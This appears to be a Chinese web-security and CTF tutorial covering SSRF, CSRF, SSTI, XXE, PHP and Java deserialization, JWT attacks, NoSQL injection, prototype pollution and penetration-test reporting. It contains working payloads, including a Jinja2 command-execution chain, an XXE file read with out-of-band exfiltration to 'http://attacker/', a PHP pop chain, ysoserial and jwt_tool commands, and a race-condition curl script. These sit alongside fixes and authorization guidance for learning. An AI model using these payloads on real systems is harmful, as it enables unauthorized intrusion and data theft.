| 过滤 127.0.0.1 | 127.1、0.0.0.0、[::1]、2130706433、0x7f000001、127.0.0.1.nip.io |
| 过滤 localhost | 同上，或 DNS 重绑定（第一次解析公网 IP 过校验，第二次解析内网） |
| 只允许 http:// | 302 跳转绕过：自己的服务器跳回内网地址 |
| 校验 URL 前缀 | user@host 形式：http://expected.com@evil.com/ |
| 校验 host 但没校验端口 | 直接换端口找内网服务 |
| 禁 file 协议 | 用 gopher / dict 曲线读文件或打服务（取决于库） |

**修复：白名单 + 解析后校验**

```php
<?php
// 1. 只允许明确需要的协议
$scheme = parse_url($url, PHP_URL_SCHEME);
if (!in_array($scheme, ['http', 'https'])) die("协议不允许");

// 2. 解析域名成 IP，再判断是不是内网地址
$host = parse_url($url, PHP_URL_HOST);
$ip = gethostbyname($host);
if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
    die("内网地址不允许");
}

// 3. 禁止跟随跳转（curl: CURLOPT_FOLLOWLOCATION => false）
// 4. 出站流量走统一代理，在代理层做白名单
?>
```

> 💡 SSRF 的修复比利用更难：因为「解析」和「连接」之间有时间差（DNS 重绑定就利用这一点）。生产上最可靠的做法是**出站白名单代理**，而不是在代码里做黑名单过滤。

## CSRF：借你的手发请求

*约 30 分钟*

> 🎯 **本节目标**：理解「浏览器自动带 Cookie」为什么能变成攻击，以及 Token / SameSite / Origin 各自防住了什么。

CSRF（跨站请求伪造）不偷你的 Cookie，也不读你的数据。它只做一件事：**让浏览器带着你的 Cookie，去发一个你没想发的请求。**因为 Cookie 是「按域名自动附带的」，浏览器不会问「这是不是你自己点的」。

**最小 PoC（攻击者页面）**

```html
<!-- 受害者登录了 bank.com 后，访问攻击者页面即触发 -->
<form action="https://bank.com/transfer" method="POST" id="f">
  <input name="to" value="hacker">
  <input name="amount" value="10000">
</form>
<script>document.getElementById('f').submit()</script>

<!-- 页面看起来什么都没发生，请求已经带着受害者的 Cookie 发出去了 -->
```

**成立条件与防护手段**

| 条件 / 手段 | 说明 |
| --- | --- |
| 前提 1 | 目标用 Cookie 维持身份（Session/Cookie 认证） |
| 前提 2 | 敏感操作只校验「有没有登录」，没有额外凭证 |
| CSRF Token | 每个表单带一次性随机令牌，攻击者跨站拿不到它 |
| SameSite Cookie | Lax：跨站 POST 不带 Cookie；Strict：跨站一律不带 |
| 校验 Origin/Referer | 请求来源不是自己站点就拒绝 |
| 二次验证 | 转账/改密要求再输密码或验证码（最稳） |

### 为什么 CSRF Token 能防住

同源策略让攻击者的页面**读不到**目标站点的页面内容——包括页面里的 Token。所以攻击者能「让浏览器发请求」，但发不出「带正确 Token 的请求」。这就是 CSRF 防护的核心逻辑：**把「身份」和「本次操作」绑在一起。**

**后端怎么校验 Token**

```php
<?php
session_start();
// 生成：只有本站页面能拿到这个值
$token = bin2hex(random_bytes(16));
$_SESSION['csrf'] = $token;
// 页面：<input type="hidden" name="csrf" value="<?= $token ?>">

// 校验：POST 上来的 token 必须和 session 里的一致
if (!hash_equals($_SESSION['csrf'], $_POST['csrf'] ?? '')) {
    die("CSRF token 校验失败");
}
?>
```

**常见变体**

```html
GET 型：<img src="https://bank.com/transfer?to=hacker&amount=10000">
  -> 说明敏感操作绝不能用 GET

JSON 型：需要用表单发 application/json 通常不行，
  但目标若接收 text/plain 或 x-www-form-urlencoded 的 JSON，就能打

配合 XSS：XSS 能读页面里的 Token，CSRF 防护直接失效
  -> 所以 XSS 比 CSRF 危险得多
```

> 💡 CTF 里 CSRF 题常考「让你构造一个 PoC 页面并提交给 bot 访问」。要点：**表单自动提交、目标站点的 Cookie 要被带上、别用 fetch（会被 CORS 拦）**。

## SSTI：模板注入

*约 35 分钟*

> 🎯 **本节目标**：能识别「用户输入被当模板解析」，知道 Jinja2/Twig/FreeMarker 的探测与利用思路。

模板引擎本来负责把数据填进 HTML。但如果你能把 `{{ ... }}` 之类的内容塞进模板**源码**，模板引擎就会把它当表达式求值——这就是 SSTI（服务端模板注入）。它通常来自「用用户输入拼模板」或「用模板引擎渲染用户提供的字符串」。

**漏洞是怎么产生的**

```php
<?php
// 危险：把用户输入当成模板源码渲染
$name = $_GET['name'];
echo $twig->render('Hello {{ name }}', ['name' => ...]);   // 安全（name 只是数据）

// 危险写法（很多教学题故意这么写）
echo $twig->createTemplate('Hello ' . $_GET['name'])->render([]);
// 输入 {{7*7}} 就会输出 49
?>
```

**一句话判断有没有 SSTI**

| 输入 | 回显 | 说明 |
| --- | --- | --- |
| {{7*7}} | 49 | Jinja2（Python）、Twig（PHP）、Spring 的 Thymeleaf 类 |
| ${7*7} | 49 | FreeMarker（Java）、部分 Thymeleaf 表达式 |
|  | 49 | ERB（Ruby） |
| #{7*7} | 49 | Ruby 插值、部分 Java 表达式语言 |
| ${7*7} 或 {{7*7}} 无变化 | 原样 | 可能被转义，或没有 SSTI |

**Jinja2（Flask）常见探测与利用思路**

```python
# 1. 确认模板引擎
{{7*7}}

# 2. 看配置（Flask 的 config 对象是全局的）
{{ config }}
{{ config.items() }}

# 3. 从内置对象出发，找能执行命令的类
{{ ''.__class__.__mro__[1].__subclasses__() }}
# 在返回的大列表里找 Popen / os 相关类，再调用
{{ ''.__class__.__mro__[1].__subclasses__()[<下标>]('id',shell=True).communicate() }}

# 4. 常见过滤绕过思路
#   .__ 被过滤   -> 用 attr 过滤器：{{ 'a'.__class__ }} 换成 {{ 'a'|attr('__class__') }}
#   [] 被过滤    -> 用 ( ) 调用的等价方式
#   关键字被过滤 -> 用字符串拼接或 request.args 传参
```

**算一下探测链的原理**

```python
# ''.__class__            -> <class 'str'>
# ''.__class__.__mro__    -> (str, object)   找基类
# [1] 就是 object
# object.__subclasses__() -> 所有已加载的子类
# 目标：找到能执行命令的类（如 subprocess.Popen）或能读文件的类
#
# 所以整条链是：字符串对象 -> 它的类 -> 基类 -> 全部子类 -> 挑一个危险类 -> 调用
```

> 💡 SSTI 的利用链和「沙箱里有什么对象」强相关：同一个 payload 在本地能跑，在题目里可能因为禁了某个类就失效。所以必须**有源码就看源码，没源码就逐个探测**——这是最依赖「读源码」能力的一类题。

### 修复

- 用户输入永远只作为**模板变量**传入，不要拼进模板源码。
- 必须动态渲染时，用沙箱化模板（如 Jinja2 SandboxedEnvironment）并限制可用对象。
- 把模板引擎的调试模式关掉；错误信息不要直接回显。
- 限制模板能访问的对象：传入 `autoescape=True`，禁用 `__` 属性访问。

## XXE：XML 外部实体

*约 30 分钟*

> 🎯 **本节目标**：理解 XML 实体为什么能读文件、打内网，以及盲 XXE 的带外思路。

XML 允许在 DOCTYPE 里定义「实体」，实体的值可以是一个外部 URI。解析器读到 `&xxe;` 时，会去读取那个 URI 指向的内容并替换进来——如果这个 URI 是 `file:///etc/passwd`，服务端文件就被读出来了。

**最小 PoC（有回显）**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><name>&xxe;</name></root>
```

**盲 XXE：把内容带外**

```xml
<!-- 页面不回显，用外部 DTD 把读到的内容拼进请求发给攻击者 -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker/evil.dtd">
  %dtd;
]>

<!-- evil.dtd 内容：把 %file 的内容塞进 URL 参数，向攻击者发起请求 -->
<!-- <!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker/?d=%file;'>"> %all; -->
```

**XXE 的三种打法**

| 场景 | 手法 | 前提 |
| --- | --- | --- |
| 有回显 | 直接 &xxe; 读文件 | 解析结果的字段被显示出来 |
| 无回显 | 外部 DTD 把内容带外（OOB） | 服务器能主动访问外网（DNS/HTTP） |
| 无外网 | 报错信息带出（error-based） | 报错被回显，且实体能被拼进报错 |
| 打内网 | ENTITY 指向内网 http 服务，做 SSRF | 服务器能访问内网 |

**进阶：读 PHP 源码（绕过 filter 限制）**

```xml
<!-- 读不到文件时，用 php://filter 让文件内容变成 base64 再带出 -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
]>
<root><name>&xxe;</name></root>
```

**前提条件**：服务的 XML 解析器允许外部实体。PHP 的 libxml 2.9 以前默认开启，之后默认关闭（但代码里用 `LIBXML_NOENT` 等选项仍可能打开）。Java 的 DocumentBuilderFactory 默认也有此问题，需要手动关闭。

### 修复

- 禁用 DTD 与外部实体：PHP 用 libxml_disable_entity_loader(true)（旧版），新环境用 `LIBXML_NONET`。
- Java：`factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`。
- Python：lxml 用 `resolve_entities=False`；defusedxml 直接替换标准库解析器。
- 实在不需要 XML 就换成 JSON。

> 💡 XXE 题的第一动作是**确认 XML 解析点有没有回显**。有回显就直接读；没有就先试 DNSLog 看有没有回连（判断能否带外），再决定用 OOB 还是报错。

## 反序列化（PHP）

*约 40 分钟*

> 🎯 **本节目标**：看懂 PHP 序列化字符串，理解魔术方法如何被串成利用链（pop chain）。

序列化是把对象变成字符串，反序列化是把字符串还原成对象。危险点在于：**反序列化一个可控的字符串，等于让攻击者构造对象。**而对象在被创建、销毁、被当字符串用时，会自动触发魔术方法——这些魔术方法里如果有危险函数，就有了链。

**序列化格式**

```php
<?php
class A { public $cmd = "whoami"; }
echo serialize(new A());
// O:1:"A":1:{s:3:"cmd";s:6:"whoami";}

// O: 对象  s: 字符串  i: 整数  a: 数组  b: 布尔  N: null
// 数字是长度，必须完全匹配，否则解析失败
// -> 这也是绕过技巧：改长度/属性个数，让 __wakeup 前的解析行为变化
?>
```

**魔术方法 = 链上的触发点**

```php
__construct()   new 时调用（反序列化时不触发）
__wakeup()      反序列化时立刻调用
__destruct()    对象销毁时调用
__toString()    被当字符串用时调用（echo / 拼接）
__call()        调用不存在的方法时
__get()/__set() 访问不存在属性时
__sleep()       序列化时调用
__invoke()      对象被当函数调用时

// 典型链：unserialize 入口 -> __wakeup -> ... -> __destruct -> 危险函数
```

**一个最小的利用链**

```php
<?php
class Start {
    public $obj;
    function __destruct() {
        $this->obj->run();      // 销毁时调用 obj 的 run()
    }
}
class Exec {
    public $cmd;
    function run() {
        eval($this->cmd);        // 危险函数
    }
}
// 构造：让 Start.obj 指向 Exec，并把 cmd 设成我们的代码
$payload = new Start();
$payload->obj = new Exec();
$payload->obj->cmd = "system('id');";
echo serialize($payload);
// 提交这串字符串给 unserialize() 即可执行
?>
```

### 找链的方法（重点）

1. 先找入口：代码里哪里调用了 `unserialize()`，参数是否可控。
2. 列出所有魔术方法：每个类里有哪些 `__wakeup` / `__destruct` / `__toString`。
3. 从魔术方法里找「能被我控制的方法调用」：`$this->x->y()` 这种，x 可控就能换类。
4. 顺着调用走，直到遇到危险函数（eval、system、include、文件写）。
5. 把路径上的属性值按顺序填好，序列化出来提交。
6. 工具：phpggc 可以生成常见框架的链（ThinkPHP、Laravel、Guzzle）。

**常见过滤与绕过**

| 过滤 | 绕过思路 |
| --- | --- |
| 过滤 O: 开头 | 用 a: 数组嵌套对象；或用 C: 自定义序列化 |
| 过滤 "类名" | 大小写、字符串偏移、PHP 7.4 的 C: 格式 |
| 校验属性个数 | 改 O:1:"A":1: 里的 1 为 2（旧版 PHP 会跳过 __wakeup 的某些检查） |
| __wakeup 里 die | 用 __destruct 链，或触发其他魔术方法 |

> 💡 反序列化不是「背 payload」，而是**读代码找路径**。真正的题目里类都藏在框架源码里，所以要会顺着 composer.json 找依赖、顺着自动加载找类文件。

## 反序列化（Java）与组件漏洞

*约 40 分钟*

> 🎯 **本节目标**：知道 Java 反序列化的入口、识别组件与版本，理解 ysoserial 与 JNDI 注入。

Java 的反序列化问题更「工程化」：入口很多，利用链大多来自第三方库（CommonsCollections 等），所以题目的难点是**识别组件和版本**，而不是从零构造链。

**Java 反序列化的入口**

```
ObjectInputStream.readObject()

常见的数据位置：
- Cookie / Header：rememberMe、X-Auth 等 base64 字段
- 表单参数：base64 后的序列化字节（开头是 rO0AB）
- RMI / RPC / JNDI 调用
- 框架内部：Shiro、Fastjson、Jackson、XStream
```

**常见利用链家族**

| 组件 | 利用链 | 特征 |
| --- | --- | --- |
| CommonsCollections 3.x | CC1 / CC3 / CC5 / CC6 / CC7 | commons-collections.jar 版本 |
| CommonsBeanutils | CB1 | commons-beanutils.jar |
| Shiro | rememberMe 反序列化 | Cookie 里有 rememberMe=deleteMe 或 base64 大串 |
| Fastjson | autoType 绕过 | JSON 里 @type 字段 |
| Log4j2 | JNDI 注入（log4shell） | 日志里出现 ${jndi:ldap://...} |
| Jackson | 多态反序列化 | enableDefaultTyping 配置 |

### 做题流程

1. 看到 `rO0AB` 开头的 base64，或名为 rememberMe 的 Cookie，基本可以确定是 Java 反序列化。
2. 去找组件：能读源码就看 pom.xml / build.gradle / Web-INF/lib；不能读就靠报错、栈信息、页面指纹。
3. 确定版本区间：同一家族的不同版本对应不同链（如 CC3 与 CC1 的 payload 不同）。
4. 用 ysoserial 生成对应链的 payload，做 base64 后提交。
5. JNDI 类场景，改用 ldap/rmi 外部服务接收请求（JNDIExploit、rogue-jndi）。

**ysoserial 基本用法**

```bash
# 生成 CC1 链的 payload（执行命令）
java -jar ysoserial.jar CommonsCollections1 "touch /tmp/pwned" > payload.bin

# base64 后提交
base64 -w0 payload.bin

# 常见链名
# CommonsCollections1/3/5/6/7、CommonsBeanutils1、URLDNS（只做探测）
```

> 💡 Java 题最省时间的判断：**先看有没有 rO0AB / rememberMe / Fastjson 的 @type**。有就直接走对应链，没有就去读依赖列表。版本号决定了用哪条链，这一步错了 payload 一定打不通。

## 认证绕过：Session / JWT / Cookie

*约 35 分钟*

> 🎯 **本节目标**：掌握三类「冒充身份」的常用手法，并能用工具验证。

认证绕过是 CTF 里性价比最高的一类：不用拿 shell，改一个字段就能进后台。

**JWT 的四类攻击**

```
1. alg 改成 none，删掉签名段
   {"alg":"none"} . payload . （空签名）
   -> 服务器若没显式拒绝 none，直接通过

2. 弱密钥爆破
   用 jwt_tool / hashcat，字典来自常见弱口令

3. 算法混淆（RS256 -> HS256）
   前提：服务器用公钥验证，但代码里把公钥当 HS256 的密钥用
   -> 用公钥当 HMAC 密钥重新签名

4. kid 注入
   kid 指向可控文件（../dev/null）或直接拼进 SQL
   -> 用空密钥 / 用已知文件内容当密钥
```

**jwt_tool 常用命令**

```bash
python3 jwt_tool.py <JWT> -M at            # 自动跑各种攻击
python3 jwt_tool.py <JWT> -C -d wordlist.txt # 爆破 HS256 密钥
python3 jwt_tool.py <JWT> -X a             # alg=none
python3 jwt_tool.py <JWT> -X k -pk public.pem  # 算法混淆
```

**Session / Cookie 攻击面**

| 手法 | 说明 |
| --- | --- |
| session id 可预测 | 时间戳、自增值、MD5(用户名) 之类 |
| 伪造 Cookie 里的权限字段 | role=admin、is_admin=1，后端直接信任 |
| Session Fixation | 让受害者用攻击者已知的 session id 登录 |
| Cookie 里是序列化数据 | PHP/Java 反序列化入口 |
| JWT 放在 localStorage | XSS 可直接读走 |

### 判断顺序（按成本从低到高）

1. 先看 token 结构：JWT 就 base64 解开 header/payload，看 role 之类的字段。
2. 改 payload 里的权限字段，看签名是否被校验（不校验直接过 = 最简单）。
3. 查 alg 是否接受 none，用 jwt_tool -X a 试。
4. 用常见弱口令爆破 HS256 密钥。
5. 看 kid/x5u/jku 等字段是否可控。
6. 以上都不行，再考虑 session 伪造或反序列化。

**JWT 结构（自己拆一遍）**

```python
import base64, json
tok = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjEsInJvbGUiOiJ1c2VyIn0.xxxxx"
h, p, s = tok.split(".")
pad = lambda x: x + "=" * (-len(x) % 4)
print(json.loads(base64.urlsafe_b64decode(pad(h))))
print(json.loads(base64.urlsafe_b64decode(pad(p))))
# 输出：{'alg': 'HS256', 'typ': 'JWT'}  {'uid': 1, 'role': 'user'}
# 注意：payload 是"明文"，只是 base64，不是加密
```

> 💡 记住一个底层事实：**JWT 的安全性 100% 依赖签名校验**。payload 谁都能看、谁都能改。所有攻击最终都是「让服务器接受一个我没签过的 payload」。

## 逻辑漏洞与越权

*约 30 分钟*

> 🎯 **本节目标**：理解「代码没写错，但业务逻辑被绕过」，建立挖逻辑漏洞的固定流程。

逻辑漏洞没有「注入点」这种明确标志，它的定义是：**功能按设计跑起来了，但某个假设被攻击者破坏了**——比如「用户只会改自己的 id」「金额只能是正数」「支付必须先付款」。

**常见类型**

| 类型 | 具体表现 | 怎么试 |
| --- | --- | --- |
| 水平越权 | 改 id 看别人的订单/资料 | 把用户 id 改成相邻值 |
| 垂直越权 | 普通用户直接调管理员接口 | 抓管理员的请求，换成普通账号重放 |
| 价格篡改 | 改单价、数量为负、优惠券叠加 | 改请求体里的金额字段 |
| 支付绕过 | 跳过支付步骤、改金额、重放 | 删掉中间步骤直接请求最后一步 |
| 验证码问题 | 复用、爆破、短信轰炸、前端校验 | 同一验证码用两次；写成 0000–9999 爆破 |
| 流程竞争 | 同一优惠券并发使用多次 | 多线程同时发请求 |

### 挖逻辑漏洞的四步

1. 正常走一遍完整流程，用 Burp 记下**每一个**请求（注册、登录、下单、支付、退款）。
2. 逐个问：这一步的「前提」是服务器保证的，还是前端/上一步保证的？
3. 改掉你觉得「不该被改」的参数：id、数量、金额、状态、时间、角色。
4. 重复、并发、乱序地发请求——很多漏洞只在「同时发生」时出现。

**一个典型的越权**

```
# 正常：GET /api/order?id=1001      （当前用户自己的订单）
# 越权：GET /api/order?id=1002      （别人的订单，服务器没校验归属）

# 修复：从 session 里取用户 id，而不是从请求里取
# 错误：SELECT * FROM orders WHERE id = $_GET['id']
# 正确：SELECT * FROM orders WHERE id = ? AND user_id = ?
```

**并发竞争的最小验证**

```bash
# 用同一张优惠券同时发 20 个请求，看是否都被接受
seq 20 | xargs -P 20 -I{} curl -s -b "session=..." \
  -X POST https://target/api/coupon/use -d "code=XXXX" -o /dev/null -w "%{http_code}\n"

# 原理：后端顺序是「查是否已用 -> 用掉 -> 更新状态」
# 并发时多个请求在「查」之后、更新之前都通过了检查
```

> 💡 逻辑漏洞无法靠字典扫，全靠对业务流程的理解。**这类题最考耐心和观察力，也最接近真实的渗透测试**——因为它是真正「读懂系统」的体现。

## NoSQL 注入

*约 25 分钟*

> 🎯 **本节目标**：理解 MongoDB 查询对象的注入方式，以及和 SQL 注入的共同点。

NoSQL 数据库（MongoDB 最常见）用「对象」来描述查询条件。如果后端把用户输入直接拼进查询对象，攻击者就能构造出「匹配任意值」的条件——这和 SQL 注入同源，只是注入的载体从字符串换成了对象。

**MongoDB 注入原理**

```js
// 正常查询
db.users.find({ username: name, password: pw })

// 攻击：让 password 变成「不等于 1」的查询对象
// 请求：?username=admin&password[$ne]=1
// 后端解析成 { username: 'admin', password: { $ne: 1 } }
// -> 只要密码不等于 1 就匹配，等于绕过密码校验

// 其他常用操作符
?username[$regex]=^adm&password[$ne]=1
?username[$gt]=&password[$gt]=
```

**常用操作符与含义**

| 操作符 | 含义 | 注入用法 |
| --- | --- | --- |
| $ne | 不等于 | $ne=1 让密码校验永远为真 |
| $gt / $lt | 大于 / 小于 | $gt= 空串匹配任何存在的值 |
| $regex | 正则匹配 | 逐字符猜用户名/密码 |
| $exists | 字段存在 | 探测字段 |
| $where | JS 表达式（旧版） | 直接执行 JS，危害最大 |

**后端漏洞代码与修复**

```js
// 危险：直接把 req.body 当年的查询条件
app.post('/login', (req, res) => {
  db.collection('users').findOne({ username: req.body.username, password: req.body.password })
    .then(u => res.send(u ? 'ok' : 'fail'));
});

// 修复 1：强制把参数转成字符串
const username = String(req.body.username);
// 修复 2：用 express-mongo-sanitize 去掉 $ 开头的键
// 修复 3：密码比对在应用层做（hash 比对），不要拼进查询条件
```

> 💡 CTF 里 NoSQL 注入的入口通常是登录框；用 `[$ne]=1` 或 `[$regex]` 试一下就知道。判据和 SQL 盲注一样：**看响应差异**。

## 原型链污染

*约 35 分钟*

> 🎯 **本节目标**：理解 Object.prototype 被污染后为什么会影响全局，以及常见入口与危害。

JavaScript 里所有普通对象都继承自 `Object.prototype`。如果你能把一个属性写进这个「公共祖先」，那么之后**任何**对象访问这个属性都会拿到它——即使你根本没在自己身上定义过。很多「深拷贝 / 合并配置」的函数就会无意中提供这个写入能力。

**漏洞原理（不安全的 merge）**

```js
function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === "object") {
      target[key] = target[key] || {};
      merge(target[key], source[key]);   // ← 没有过滤 __proto__
    } else {
      target[key] = source[key];
    }
  }
}

merge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
console.log({}.isAdmin);   // true  —— 所有对象都被污染了
```

**为什么「所有对象」都受影响**

```js
// 每个对象字面量 { } 的原型都是 Object.prototype
const a = {};
const b = {};        // a、b、c 都共享同一个 Object.prototype
console.log(a.isAdmin);  // true
console.log(b.isAdmin);  // true

// prototype vs __proto__
// Foo.prototype           : 构造函数的「原型对象」，给它加属性影响所有实例
// obj.__proto__           : 对象自身指向的原型（通常就是 Foo.prototype）
// 所以 obj.__proto__.x = 1  等价于给原型链上层加属性
```

**常见入口与危害**

| 入口 | 说明 |
| --- | --- |
| JSON 参数合并 | 如要求前端把配置对象 POST 上来，后端 deepMerge |
| URL 参数解析 | qs 库老版本对 a[__proto__][x]=1 的解析 |
| 模板引擎配置合并 | 污染 options 影响后续渲染 |
| 危害：模板注入 | 污染模板引擎的设置，导致代码执行 |
| 危害：沙箱逃逸 | 污染子进程选项（如 shell、env） |
| 危害：绕过校验 | 污染 isAdmin 之类的判断字段 |

### 怎么修

- 合并前过滤键：拒绝 `__proto__`、`constructor`、`prototype`。
- 用 `Object.create(null)` 创建无原型对象存放配置。
- 用 `Object.defineProperty` 定义属性，或用 `Map` 代替普通对象。
- 依赖库要升级：lodash、qs 等历史版本已有修复。
- 解析 JSON 后做一次递归的白名单过滤。

> 💡 原型链污染题在 Node.js 方向很常见。判断方法：**找「合并 / 深拷贝」的入口**；利用的关键是「污染完能不能影响后续某个危险操作」，单靠污染本身通常没意义。

- [PortSwigger · Prototype pollution](https://portswigger.net/web-security/prototype-pollution)

## 渗透测试全流程：一次授权的测试长什么样

*约 30 分钟*

> 🎯 **本节目标**：能说出渗透测试的六个阶段，以及每个阶段「做什么、产出什么、边界在哪」。

CTF 题目只是「给你一个入口，把 flag 找出来」。真实工作里，一次测试是从**授权**开始的，中间有大量不是打漏洞的工作：范围确认、资产梳理、验证记录、风险沟通、修复复测。这一节先把整条链走一遍。

**六个阶段（PTES 简化版）**

| 阶段 | 做什么 | 产出 |
| --- | --- | --- |
| ① 前期沟通 | 确认授权书、范围（域名/IP/时间窗）、禁止项（社工、破坏性操作） | 授权书、测试范围表 |
| ② 信息收集 | 子域、端口、指纹、目录、历史泄露（GitHub/备份）、员工信息 | 资产清单与攻击面地图 |
| ③ 威胁建模 | 按资产价值与暴露面排序，挑最可能成功的路径 | 优先级列表 |
| ④ 漏洞验证 | 每个疑似点做最小验证，记录请求/响应证据 | 漏洞清单（含复现步骤） |
| ⑤ 利用与后渗透 | 拿到权限后评估影响范围（绝不越权、绝不破坏） | 影响描述与证据 |
| ⑥ 报告与复测 | 风险评级、修复建议、复测确认 | 报告 + 复测记录 |

CTF 里你只做 ④（验证）和 ⑤（拿到 flag）；但找工作、打真实项目、做 SRC 时，②③⑥ 才是拉开差距的地方。

1. 把六个阶段抄进笔记，每个阶段后面写一句「这一步的产出是什么」。
2. 找一份公开的授权测试模板（SOW）读一遍，体会「范围」写得多细。
3. 想一想：如果没有授权就动手，你会踩到哪些法律红线（回到 p0l2）。

> 💡 「Web 不只是漏洞」——攻击链的每一环都要有依据。真实测试里，能说清「我怎么发现的、影响是什么、怎么修」比多打一个 shell 更有价值。

## 信息收集与资产测绘：先画地图再动手

*约 40 分钟*

> 🎯 **本节目标**：能对一个授权目标做一轮基础信息收集，产出一张「资产 + 端口 + 指纹」清单。

信息收集决定后面所有工作的上限。它的目标不是「扫得越多越好」，而是**用最少的请求画出最准的地图**：有哪些域名、哪些端口、什么技术栈、有没有泄露。

**四类收集**

| 类型 | 手段 | 常见工具 |
| --- | --- | --- |
| 域名与子域 | 证书透明度日志、字典爆破、搜索引擎 | crt.sh、subfinder、amass |
| 端口与服务 | 常见端口扫描、服务识别 | nmap、masscan（授权目标） |
| Web 指纹与路径 | 响应头、报错页、目录探测 | whatweb、dirsearch、Burp |
| 公开信息 | GitHub 泄露、网盘、招聘信息、历史备份 | GitHub 搜索、Google dork |

**一次最小化的收集流程**

```bash
# 1. 子域（从证书透明日志拿公开记录）
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u

# 2. 端口与服务
nmap -sV -p 80,443,8080,3306,6379 target.com

# 3. Web 指纹
curl -I https://target.com/
whatweb https://target.com/

# 4. 目录与泄露（小字典先跑）
dirsearch -u https://target.com/ -e php,bak,zip,txt
```

**产出应该长什么样**

| 资产 | 端口/服务 | 指纹 | 备注 |
| --- | --- | --- | --- |
| www.target.com | 443 nginx | ThinkPHP 5.0 | 疑似旧版本，优先验证 |
| admin.target.com | 443 | Spring Boot + Actuator | actuator 未关闭 |
| target.com | 8080 Tomcat | Java 8 | 管理后台弱口令待验证 |

> 💡 所有收集动作都必须落在授权范围内；测完删掉本地数据。信息收集的最大风险不是「扫不到」，而是「扫了不该扫的」。

## 漏洞验证与利用：把「可能」变成「已证明」

*约 35 分钟*

> 🎯 **本节目标**：学会用最小验证证明一个漏洞，并记录可复现的证据。

新人最容易犯的错是「看到一个参数就写报告说这里有注入」。验证的标准只有一条：**能稳定复现，且能说明影响**。

**验证的三条纪律**

| 纪律 | 做法 | 为什么 |
| --- | --- | --- |
| 最小化 | 只证明存在，不多取数据、不拖库 | 降低风险，也符合授权范围 |
| 可复现 | 保存原始请求/响应、时间、账号 | 别人能照着重放 |
| 有影响 | 说明能读到什么、改到什么 | 决定风险等级 |
| 留证据 | 截图 + 文本，别只留截图 | 报告需要原始数据 |

**一条合格的验证记录**

```
漏洞：订单详情水平越权
位置：GET /api/order?id=1001（当前账号 A）
验证：把 id 改为 1002，返回 B 用户的收货地址与手机号
证据：原始请求 / 响应（附）、两个账号信息、时间戳
影响：任意用户可读取他人订单与隐私信息
建议：服务端按 session 的 user_id 过滤，并返回 403
复测：修复后同一请求返回 403，已验证
```

> 💡 CTF 里「拿到 flag 就算赢」，真实测试里「能证明影响、能帮助修复」才算完成。这也是为什么同一道题，有人写报告像流水账，有人能卖出价钱。

## 后渗透与内网：拿到 webshell 之后

*约 35 分钟*

> 🎯 **本节目标**：了解拿到权限后的常见动作与边界，知道哪些能做、哪些绝对不做。

这一步在 CTF 里常常是「读个 flag 就结束」，在真实授权测试里则要回答一个问题：**这个入口能造成多大影响？**但所有动作都要在授权范围内，且以「不破坏、不外传数据」为前提。

## 报告与合规：风险评级、复现步骤与修复建议

*约 30 分钟*

> 🎯 **本节目标**：能写出一份让开发看得懂、改得动的漏洞报告。

报告是渗透测试的最终交付物。开发不关心你用了什么工具，只关心三件事：**在哪、怎么复现、怎么修**。

**一份报告的骨架**

| 部分 | 写什么 | 常见问题 |
| --- | --- | --- |
| 标题 | 漏洞类型 + 位置（如「订单接口水平越权」） | 写成「发现漏洞」 |
| 风险等级 | CVSS 或高/中/低，给出理由 | 只给等级不给理由 |
| 复现步骤 | 编号步骤 + 原始请求 | 步骤缺登录态/参数 |
| 影响 | 能读到什么、影响多少用户 | 写「危害巨大」没有细节 |
| 修复建议 | 具体到代码/配置层 | 只写「加强校验」 |
| 复测 | 修复后同样请求的结果 | 没有复测 |

**风险评级的一个简单口径**

```
高危：无需登录即可利用；或可读取大量敏感数据；或可直接执行命令
中危：需要普通账号；影响单个用户数据；或需要特定条件
低危：信息泄露（版本、路径）；需要极高交互成本
提示：仅内部信息、配置建议

（正式项目用 CVSS v3.1 计算，并附向量字符串）
```

> 💡 写报告时想象读者是赶工期的开发：**他能不能照着你写的步骤，在 10 分钟内复现并改掉**。这才是报告的合格线。

## 拿到一道题的第一分钟：做这七件事

*约 30 分钟*

> 🎯 **本节目标**：形成一套固定起手式：七件事做完，题目至少会给你三个可尝试的方向。

新手最常见的状态是：打开题目，看一圈，不知道从哪开始。老手的区别不是更聪明，而是**有一套固定动作**。这套动作不保证解出题，但保证你不会停在「一片空白」。

**七件事（按成本从低到高）**

| # | 动作 | 看什么 | 常见结论 |
| --- | --- | --- | --- |
| ① | 读题面 | 题名、描述、附件、提示 | 题名往往就是方向（备份文件 / 源码泄露 / 弱口令） |
| ② | 看 URL 结构 | 有没有 ?id= ?file= ?url= ?page= ?cmd= | 参数名直接指向漏洞类型 |
| ③ | 看页面源码 | HTML 注释、隐藏 input、内联 JS | 隐藏字段、flag、接口名 |
| ④ | 看 Network | 页面加载了哪些接口、传了什么 | 可复现的请求、可疑 API |
| ⑤ | 看响应头 | Server / X-Powered-By / Set-Cookie | 技术栈与框架 |
| ⑥ | 试探性输入 | 单引号、{{7*7}}、&lt;script&gt;、../、127.0.0.1 | 报错 / 回显 / 延时 = 信号 |
| ⑦ | 记录异常 | 报错、变长、跳转、变慢 | 异常就是入口 |

### 七件事的手动流程

1. 用 Burp 或 DevTools 打开题目，先**不要**着急改包，把页面完整走一遍。
2. 把每个功能点列出来：登录、注册、搜索、上传、下载、评论、导出、设置。
3. 对每个功能点问一句：**它背后可能用到哪种漏洞**？（见下面的功能地图）
4. 把「URL 参数 / 表单字段 / Cookie / Header」四处的输入位置各试一次。
5. 在笔记里写三行：这是什么类型的站、有哪些入口、我打算先试哪两个。

**功能 → 漏洞地图**

| 功能 | 优先想 |
| --- | --- |
| 搜索框 / 回显输入 | XSS、SSTI、SQLi |
